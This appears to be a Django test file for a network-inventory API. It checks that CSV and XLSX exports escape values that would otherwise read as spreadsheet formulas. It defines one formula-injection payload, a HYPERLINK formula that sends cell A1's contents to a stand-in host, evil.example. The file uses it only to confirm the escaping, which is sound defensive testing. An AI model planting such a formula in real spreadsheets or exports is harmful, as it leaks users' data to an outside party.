"""Exported text never reads as a spreadsheet formula (#256)."""
from __future__ import annotations

import io

from django.contrib.auth.models import User
from django.test import SimpleTestCase
from openpyxl import Workbook, load_workbook
from rest_framework.test import APITestCase

from api.bulk_import import parse_rows
from api.models import Prefix, Site
from api.spreadsheet import csv_cell, csv_unescape, xlsx_text_row
from api.test_utils import status_for
from auth_api.models import UserProfile
from core.models import Organization, Tenant

EVIL = '=HYPERLINK("http://evil.example/?"&A1,"leaf1")'


class CellTests(SimpleTestCase):
    def test_formula_starts_are_marked_and_unmarked(self):
        for v in (EVIL, "+1", "-1", "@SUM(A1)", "\tx"):
            self.assertEqual(csv_cell(v), "'" + v)
            self.assertEqual(csv_unescape(csv_cell(v)), v)
        for v in ("leaf1", "", 5, None, "'quoted"):
            self.assertEqual(csv_cell(v), v)
            self.assertEqual(csv_unescape(v), v)

    def test_xlsx_cells_stay_text(self):
        wb = Workbook()
        ws = wb.active
        ws.append([EVIL, "plain"])
        xlsx_text_row(ws)
        buf = io.BytesIO()
        wb.save(buf)
        cell = load_workbook(io.BytesIO(buf.getvalue())).active["A1"]
        self.assertEqual(cell.data_type, "s")
        self.assertEqual(cell.value, EVIL)

    def test_csv_import_takes_the_mark_off(self):
        rows = parse_rows("name,description\nleaf1,'" + "-uplink\n", "csv")
        self.assertEqual(rows[0]["description"], "-uplink")


class ExportTests(APITestCase):
    def setUp(self):
        org = Organization.objects.create(name="O", slug="o")
        self.tenant = Tenant.objects.create(org=org, name="T", slug="t")
        site = Site.objects.create(tenant=self.tenant, name="AMS")
        Prefix.objects.create(
            tenant=self.tenant, cidr="10.0.0.0/24", status=status_for(self.tenant),
            description=EVIL, site=site,
        )
        admin = User.objects.create_user("a", password="x", is_superuser=True)
        UserProfile.objects.create(user=admin).tenants.add(self.tenant)
        self.client.force_login(admin)
        self.client.post(f"/api/tenants/{self.tenant.id}/switch/")

    def test_csv(self):
        resp = self.client.get("/api/io/prefix/export/?fmt=csv")
        text = b"".join(resp.streaming_content).decode()
        self.assertIn("'=HYPERLINK", text)
        self.assertNotIn(',=HYPERLINK', text)
        self.assertNotIn(',"=HYPERLINK', text)

    def test_xlsx(self):
        resp = self.client.get("/api/io/prefix/export/?fmt=xlsx")
        ws = load_workbook(io.BytesIO(resp.content)).active
        cells = [c for row in ws.iter_rows(min_row=2) for c in row if c.value == EVIL]
        self.assertTrue(cells)
        self.assertTrue(all(c.data_type == "s" for c in cells))
